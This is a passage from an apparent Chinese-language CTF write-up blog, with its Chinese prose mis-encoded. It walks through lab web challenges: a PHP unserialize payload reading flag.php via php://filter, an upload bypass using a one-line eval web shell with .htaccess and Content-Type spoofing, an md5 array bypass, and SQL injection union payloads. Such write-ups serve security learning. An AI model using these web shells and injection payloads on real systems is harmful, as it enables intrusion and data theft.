class=\"token property\">op</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">content</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">//åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºå¯æ˜¾ç¤ºå­—ç¬¦ï¼Œå³asciiç å€¼åœ¨32~125ï¼Œ</span>\n<span class=\"token comment\">//è‹¥æ˜¯ï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›false</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;=</span> <span class=\"token number\">32</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">125</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">//è‹¥ä»¥getä¼ å‚çš„strå˜é‡çš„ASCIIç å€¼åœ¨32~125ï¼Œåˆ™è¿›è¡Œååºåˆ—åŒ–</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n\n    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span>\n\n</code></pre>\n<p><strong>ä»£ç å®¡è®¡</strong>ï¼š<code>op</code>å˜é‡ä½¿ç”¨å¼ºç±»å‹æ¯”è¾ƒ<code>===</code>åˆ¤æ–­<code>this-&gt;op</code>çš„å€¼æ˜¯å¦ç­‰äºå­—ç¬¦ä¸²2ï¼Œå¦‚æœç­‰äºï¼Œåˆ™å°†å…¶ç½®ä¸º1ã€‚åœ¨process()æ–¹æ³•ä¸­ï¼Œä½¿ç”¨å¼±ç±»å‹æ¯”è¾ƒ<code>==</code>åˆ¤æ–­opçš„å€¼æ˜¯å¦å¯¹ç­‰äºå­—ç¬¦ä¸²2ï¼Œè‹¥ä¸ºçœŸï¼Œåˆ™æ‰§è¡Œ<code>read()</code>æ–¹æ³•ä¸<code>output()</code>æ–¹æ³•ã€‚åœ¨<code>read()</code>æ–¹æ³•ä¸­ï¼Œä½¿ç”¨<code>file_get_contents()</code>å‡½æ•°æ¥è¯»å–å±æ€§filenameè·¯å¾„çš„æ–‡ä»¶ã€‚</p>\n<p>ç¼–é€ åºåˆ—åŒ–ï¼ˆåˆ©ç”¨publicå±æ€§åºåˆ—åŒ–ï¼Œç»•è¿‡<code>is_valid()</code>å‡½æ•°ï¼‰</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FileHandler</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$op</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=flag.php\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>å¾—åˆ°åºåˆ—åŒ–ç»“æœä¸º<code>O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";s:7:\"content\";N;}</code><br/> æ„é€ payloadï¼š<code>/?str=O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";s:7:\"content\";N;}</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\3902c54f179e4b408db3023fc10cff95.png\"/>ç„¶åå°†å¾—åˆ°çš„ç»“æœbase64è§£ç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\2ee38cdded944a29a838b7d44e35ab18.png\"/>æ‹¿åˆ°flag~~</p>\n<h1><a id=\"MRCTF2020_1223\"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1>\n<p><a href=\"https://blog.csdn.net/m0_52923241/article/details/119751029?spm=1001.2014.3001.5502\">å…·ä½“çŸ¥è¯†ç‚¹ç‚¹è¿™é‡Œ</a><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\6f09df13df53480bbe299fc77009c401.png\"/></p>\n<p>æˆ‘å…ˆè¯•ç€ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå»<code>&lt;?php @eval($_POST['test']);?&gt;</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\dc56d5cd180349299904cb0a51dbcc45.png\"/>ä¸Šä¼ å¤±è´¥ï¼Œ<br/> æ¥ç€åˆè¯•äº†è¯•å›¾ç‰‡é©¬ï¼Œ<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\0106b4b3a9a84203bb4eb9b7178bb53a.png\"/></p>\n<p>è¿˜æ˜¯ä¸è¡Œ<br/> ç„¶åå°±è¯•äº†ä¸€ä¸‹ä¸Šä¸ªé¢˜çš„ä¸¤ä¸ªæ–‡ä»¶<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\4774bde5fd0f4510814a96b05f03f9fb.png\"/><br/> ä¸Šä¼ <code>.user.ini</code>æ–‡ä»¶æ—¶ï¼Œä¸Šä¼ å¤±è´¥<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\682ecbf3c34042aba611fe2efd48c7fd.png\"/></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\f1c86074f655484293baeb396c946989.png\"/><br/> ä¸Šä¼ æœ¨é©¬æ–‡ä»¶æ—¶ç«Ÿç„¶æˆåŠŸäº†ï¼Œä½†æ˜¯å°è¯•ç”¨èšå‰‘è¿ä¸€ä¸‹ï¼Œè¿æ¥å¤±è´¥<br/> çœ‹æ¥ä¸Šä¸€é¢˜çš„æ–¹æ³•ä¸èƒ½ç”¨ï¼Œä¸‹é¢æ˜¯å­¦ä¹ å¤§ä½¬çš„æ–¹æ³•</p>\n<p><strong>åšé¢˜æ­¥éª¤</strong><br/> æ­¤é¢˜éœ€è¦ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶</p>\n<p>ç¬¬ä¸€ä¸ªï¼š<code>.htaccess</code>æ–‡ä»¶ï¼Œç”¨æ¥æ”¹å˜æ–‡ä»¶æ‰©å±•å</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string double-quoted-string\">\"a.png\"</span><span class=\"token operator\">&gt;</span>\nSetHandler application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>httpd<span class=\"token operator\">-</span>php\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>FilesMatch<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><code>&lt;FilesMatch \"a.png\"&gt;</code>æŒ‡å®šçš„æ˜¯è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ³¨æ„æ–‡ä»¶åå¿…é¡»ç›¸åŒ</p>\n<p>ä¸Šä¼ æ—¶å…ˆæŠ“åŒ…ï¼Œä¿®æ”¹<code>Content-Type:image/png</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\3e89c59eb1b143c6b0010c731984187f.png\"/>ç‚¹å‡»forwardï¼Œä¸Šä¼ æˆåŠŸ</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ed194737d41946e59c3052c99b27b1ae.png\"/></p>\n<p>ç¬¬äºŒä¸ªï¼šæœ¨é©¬æ–‡ä»¶ï¼Œç”¨æ¥è¿æ¥èšå‰‘æˆ–èœåˆ€<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\6f2379136e1445f895ceb729fa67fcff.png\"/><br/> ä¸Šä¼ æ—¶åŒæ ·ä¿®æ”¹<code>Content-Type:image/png</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\356a7e3249f04fc9b940021500d007ff.png\"/>ç”¨èšå‰‘è¿æ¥ï¼š<code>http://93ac29f7-de06-4936-9f07-9b157b4704d2.node4.buuoj.cn:81/upload/fa59a7192463c0cd3dae65088e762e1f/a.png</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\dec30a568ac3435e99e156416af72da0.png\"/>è¿æ¥æˆåŠŸ<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\2182fc3abc8e443c85cdca31f18ab123.png\"/><br/> æ‹¿åˆ°flag~~</p>\n<h1><a id=\"MRCTF2020Ez_bypass_1267\"></a>[MRCTF2020]Ez_bypass</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šmd5</strong><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\30b3d506973645029a0ce5eb84ddef9d.png\"/>F12æŸ¥çœ‹æºç </p>\n<pre><code class=\"prism language-php\"><span class=\"token constant\">I</span> put something in <span class=\"token constant\">F12</span> <span class=\"token keyword\">for</span> you\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$id</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$gg</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$gg</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$id</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$gg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You got the first step'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$passwd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{<!-- --></span>\n                 <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token operator\">==</span><span class=\"token number\">1234567</span><span class=\"token punctuation\">)</span>\n                 <span class=\"token punctuation\">{<!-- --></span>\n                     <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Good Job!'</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'By Retr_0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token punctuation\">}</span>\n                 <span class=\"token keyword\">else</span>\n                 <span class=\"token punctuation\">{<!-- --></span>\n                     <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"can you think twice??\"</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You can not get it !'</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'only one way to get the flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You are not a real hacker!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Please input first'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>Please input first\n</code></pre>\n<p>è¿™é‡Œè¦æ±‚<code>md5($id) === md5($gg) &amp;&amp; $id !== $gg</code></p>\n<blockquote>\n<p><code>md5($v1)===md5($v2)</code>æ•°ç»„ç»•è¿‡ï¼ša[]=a&amp;b[]=b<br/> æœ€åå¯èƒ½ä¼šæŠ¥é”™ï¼Œä½†æ˜¯<code>null=null</code>ï¼Œåˆ¤æ–­ä¸ºtrueï¼ŒæˆåŠŸç»•è¿‡</p>\n</blockquote>\n<p>ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼š<code>/?id[]=a&amp;gg[]=b</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\9facafd28fbc4da39a35a9eea00471a5.png\"/>æ¥ç€è¦ä»¥POSTä¼ å‚</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{<!-- --></span>\n                 <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token operator\">==</span><span class=\"token number\">1234567</span><span class=\"token punctuation\">)</span>\n                 <span class=\"token punctuation\">{<!-- --></span>\n                     <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Good Job!'</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                     <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'By Retr_0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                 <span class=\"token punctuation\">}</span>\n</code></pre>\n<p>å…¶ä¸­<code>is_numeric()</code>å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚è¿™é‡Œè¦æ±‚passwdä¸æ˜¯æ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²æ—¶ï¼Œå¼±ç­‰äºåˆ¤æ–­passwdæ˜¯å¦ç­‰äº1234567<br/> æ•…æ„é€ payloadï¼š<code>passwd=1234567a</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\a79cff56451f4119b14d01d371cfaa67.png\"/><br/> æ‹¿åˆ°flag~~</p>\n<h1><a id=\"GXYCTF2019BabySQli_1335\"></a>[GXYCTF2019]BabySQli</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\5a5650ed17aa4b80a2f79375c516042b.png\"/><br/> ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œéšä¾¿è¾“å…¥<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\34ad1d0e55774e9fa2c97cc579e47707.png\"/><br/> å‘ç°è¿›å…¥äº†search.php<br/> æŸ¥çœ‹æºç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\e059de45bf8740e1978126092c0b801f.png\"/><br/> ç¬¬ä¸€è¡Œæœ‰ä¸€ä¸²åŠ å¯†çš„å­—ç¬¦ï¼Œbase32+base64è§£å¯†<br/> å¾—åˆ°ï¼š<code>select * from user where username = '$name'</code><br/> çˆ†å­—æ®µæ•°ï¼š<code>name=admin' Order by 3 #&amp;pw=1</code>â€”â€”æ³¨æ„ï¼šè¿™é‡Œçš„orè¢«è¿‡æ»¤ï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡</p>\n<p>ç»æµ‹è¯•adminåœ¨ç¬¬äºŒå­—æ®µ<br/> <code>name=1' union select 1,'admin','202cb962ac59075b964b07152d234b70' #&amp;pw=123</code></p>\n<p>æœ€åæŸ¥çœ‹ä¸€ä¸‹æºç </p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span><span class=\"token constant\">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>meta http<span class=\"token operator\">-</span>equiv<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Content-Type\"</span> content<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"text/html; charset=utf-8\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span> \n<span class=\"token operator\">&lt;</span>title<span class=\"token operator\">&gt;</span><span class=\"token keyword\">Do</span> you know who am <span class=\"token constant\">I</span><span class=\"token operator\">?</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token keyword\">require</span> <span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">require</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// å»é™¤è½¬ä¹‰</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">get_magic_quotes_gpc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">stripslashes_deep</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{<!-- --></span>\n\t\t<span class=\"token variable\">$value</span> <span class=\"token operator\">=</span> <span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span>\n\t\t<span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stripslashes_deep'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span>\n\t\t<span class=\"token class-name return-type\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token variable\">$_POST</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stripslashes_deep'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_GET</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stripslashes_deep'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_COOKIE</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stripslashes_deep'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_REQUEST</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'stripslashes_deep'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'SET NAMES UTF8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pw'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$t_pw</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select * from user where username = '\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// echo $sql;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\(|\\)|\\=|or/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"do not hack me!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token 